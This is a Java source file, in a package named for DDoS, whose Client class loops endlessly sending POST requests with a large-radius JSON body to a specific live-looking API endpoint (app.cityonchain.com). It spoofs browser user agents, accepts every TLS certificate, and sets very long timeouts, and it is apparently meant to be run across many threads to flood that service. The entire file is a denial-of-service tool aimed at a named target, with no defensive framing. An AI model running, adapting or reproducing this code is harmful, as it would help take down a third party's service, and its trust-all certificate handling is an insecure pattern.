package com.design.learn.ddos;

import com.alibaba.fastjson.JSONObject;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.ssl.SSLContextBuilder;
import org.apache.http.ssl.TrustStrategy;
import org.apache.http.util.EntityUtils;

import javax.net.ssl.SSLContext;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.Charset;
import java.security.KeyManagementException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;

public class Client implements Runnable {

    public static CloseableHttpClient createSSLClientDefault() {
        try {
            SSLContext sslContext = (new SSLContextBuilder()).loadTrustMaterial((KeyStore) null, new TrustStrategy() {
                public boolean isTrusted(X509Certificate[] chain, String authType) throws CertificateException {
                    return true;
                }
            }).build();
            SSLConnectionSocketFactory sslsf = new SSLConnectionSocketFactory(sslContext);
            return HttpClients.custom().setSSLSocketFactory(sslsf).setUserAgent("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0").setDefaultRequestConfig(RequestConfig.custom().setSocketTimeout(100000000).setConnectTimeout(100000000).setConnectionRequestTimeout(100000000).build()).build();
        } catch (KeyManagementException var2) {
        } catch (NoSuchAlgorithmException var3) {
        } catch (KeyStoreException var4) {
        }

        return null;
    }


    public void run() {
        CloseableHttpClient client = Client.createSSLClientDefault();
        while (true) {
            try {

                HttpPost post = new HttpPost("https://app.cityonchain.com/api/city/zoom");
                post.setHeader("content-type","application/json");
                post.setHeader("User-Agent",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
                );

                //body = {"lat": 20.30748500000004, "lon": 25.271139, "raidus": 50000}
                JSONObject paramJson = new JSONObject();
                paramJson.put("lat","20.30748500000004");
                paramJson.put("lon","25.271139");
                paramJson.put("raidus",50000);
                StringEntity stringEntity = new StringEntity(paramJson.toJSONString(),ContentType.create("text/json", "UTF-8"));
                post.setEntity(stringEntity);
                String result = null;

                HttpResponse res = client.execute(post);
                if (res.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
                    HttpEntity entity = res.getEntity();
                    result = EntityUtils.toString(entity, "UTF-8");
                }

                System.out.println(result);

            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                client.getConnectionManager().shutdown();
            }
        }
    }
}